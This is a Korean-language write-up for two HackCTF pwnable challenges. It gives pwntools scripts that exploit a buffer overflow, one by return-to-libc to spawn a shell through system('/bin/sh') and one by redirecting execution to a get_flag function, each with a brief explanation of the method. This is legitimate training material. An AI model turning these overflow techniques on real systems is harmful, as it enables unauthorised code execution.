# HACKCTF 
## RTL_World  
~~~python
from pwn import *
r = remote("ctf.j0n9hyun.xyz",3010)
system=0x080485b0
binsh=0x8048eb1

r.recv(1024)
r.sendline("5")
r.recvuntil("[Attack] > ")
payload = 'A'*144+p32(system)+'A'*4+p32(binsh)
r.sendline(payload)
r.interactive()
~~~
우선 nc를 통해 실행시켜봤더니 엄청 복잡하다.
우선 입력할 수 있는 부분을 먼저 찾으니 선택부분과 5번 kill 부분에서 입력 가능하다.
case 5에서는 read 함수로 buf에 입력을 받음으로 여기서 공격이 가능하다.
또한 아이다에서 system 함수의 주소를 얻었다.
system 함수의 인자로 사용될 bin/sh값을 objdump | grep /bin/sh 함수로 찾아준다.
이제 payload를 dummy(144) | system 주소 | ret(4) | binsh 주소 이렇게 구성시켜주면
shell을 얻을 수 있다. 롸이트업을 계속 보고 하게 된다ㅠㅠ
## g++ pwn
~~~python
from pwn import *
r = remote("ctf.j0n9hyun.xyz",3011)
flag=0x08048f0d
payload = 'A'*4 + 'I'*20+p32(flag)
r.sendline(payload)
r.interactive()
~~~
ida를 통해 열어보니 메인 함수에는 vuln 함수만 포함되어 있다. 그리고 get_flag라는 함수의 존재를 알 수 있다.
flag는 이 함수를 통해 얻는다고 예상했다. vuln 함수의 경우에 fgets 함수로 32개를 받으므로 ret까지 도달하지 못하게 되어있다. 
어떻게 풀어야할지 감이 안 잡혀서 wirteup을 보니 replace함수를 이용해야 한다. 
replace 함수는 "I"를 "YOU"로 대체하는데 dummy의 크기를 3배 늘려 버퍼에 복사가능하도록 해준다. 
따라서 dummy 값으로 "I"를 사용하고 ret에는 get_flag의 주소를 집어넣으면 flag를 얻을 수 있다. 
